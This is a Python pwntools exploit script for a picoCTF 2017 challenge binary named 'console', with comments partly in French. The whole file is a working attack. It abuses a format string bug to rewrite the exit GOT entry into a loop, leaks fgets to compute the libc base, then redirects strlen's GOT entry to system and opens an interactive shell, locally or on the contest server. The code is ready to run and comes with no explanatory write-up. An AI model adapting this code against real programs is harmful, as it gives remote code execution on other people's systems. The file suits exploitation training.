#!/usr/bin/python
# vim: set fileencoding=utf-8 :
import argparse

from pwn import *

# Context
context.binary = './console'

#######################
# Variables générales, ne dépendent pas de l'environnement
#######################
# Part 1
EXIT_GOT_ADDRESS = 0x601258  # Adresse du pointer à remplacer
PREVIOUS_EXIT_ADDRESS = 0x00400736  # Adresse précédente
LOOP_ADDRESS = 0x4009bd  # Nouvelle adresse
ADDRESS_TO_WRITE_ON_EXIT = 0x9bd  # la partie à réécrire
# Part 2
FGETS_GOT_ADDRESS = 0x601230  # fgets function adress read from gdb
# Part 3
STRLEN_GOT_ADDRESS = 0x601210  # Adresse du pointer à remplacer


# Exploit :
# 1 : Use GOT to reference loop function as exit to use format string exploit multiple times
# 2 : find libc base adress
# 3 : call execve /bin/sh

def write_on_memory(value, address):
    log.info("Rewriting 0x%04x on 0x%08x", value, address)

    offset = 3
    command = "exit".ljust(8)
    command += ("%" + str(value - offset) + "u%18$hn").ljust(24)
    command += p64(address)
    command += '\n'

    # p.readuntil("action:")
    p.sendline(command)
    log.debug(p.readuntil("action:"))
    log.debug(p.readuntil("action:"))


############
# 1 : Modifier le GOT pour remplacer exit par loop
############
def make_a_loop():
    log.info("sending payload to make a loop")
    write_on_memory(ADDRESS_TO_WRITE_ON_EXIT, EXIT_GOT_ADDRESS)


#################################
# 2 : find libc base adress
#################################
def leak_address(address):
    command = "exit".ljust(8)
    command += "[%16$s]".rjust(8)
    command += p64(address)
    command += '\n'

    log.info("sending payload to leak address (behind %#x)", address)
    p.sendline(command)
    p.readline()
    result_line = p.readline()
    result = result_line[result_line.index('[') + 1:result_line.index(']')]
    leaked_address = ""
    for c in result:
        leaked_address = enhex(c) + leaked_address
    leaked_address = int(leaked_address, 16)
    p.readuntil("action:")

    return leaked_address


#################################
# 3 : call system /bin/sh
#################################
def call_system(base_libc_address):
    p.sendline("p test\n")
    p.readuntil("action:")

    execve_address = base_libc_address + SYSTEM_OFFSET
    common_part = (base_libc_address >> 32) << 32
    first_half = (execve_address - common_part) >> 16
    second_half = execve_address - common_part - (first_half << 16)
    third_half = base_libc_address >> 32

    log.info("Address to rewrite : %016x : %04x - %04x - %04x", execve_address, third_half, first_half, second_half)

    log.info("sending payload to override strlen GOT address")
    write_on_memory(second_half, STRLEN_GOT_ADDRESS)
    write_on_memory(first_half, STRLEN_GOT_ADDRESS + 2)
    write_on_memory(third_half, STRLEN_GOT_ADDRESS + 4)

    # p.interactive()
    p.readuntil("action:")
    log.info("calling system /bin/sh")
    p.sendline("prompt sh\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit the bins.')
    parser.add_argument('--dbg', '-d', action="store_true")
    parser.add_argument('--remote', '-r', action="store_true")
    args = parser.parse_args()
    libc_path = "./libc.so.6.remote"
#################################
# Connection
#################################

log.info("Calling vulnerable program")

if args.remote:
    p = remote('shell2017.picoctf.com', 27124)
    libc = ELF("./remote.libc.so.6")  # libc6-amd64_2.19-0ubuntu6_i386 retrieved from server

else:
    p = process(["./console", "test.log"])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # libc6_2.19-0ubuntu6.11_amd64 from my computer

FGETS_OFFSET = libc.symbols['fgets']
SYSTEM_OFFSET = libc.symbols['system']

if args.dbg:
    gdb.attach(p, """
    b *set_exit_message+61
    c
    """)

p.readuntil("action:")

#################################
# Overriding exit to make a loop
#################################
make_a_loop()

#################################
# Getting libc base address
#################################
# Leaking fgets
fgets_libc_address = leak_address(FGETS_GOT_ADDRESS)
log.info("Leaked address for fgets %#x", fgets_libc_address)
libc_base_address = fgets_libc_address - FGETS_OFFSET
log.info("Leaked libc base address %#x", libc_base_address)

# p.interactive()
# gdb.attach(p)

#################################
# Getting a bach
#################################
call_system(libc_base_address)
p.interactive()
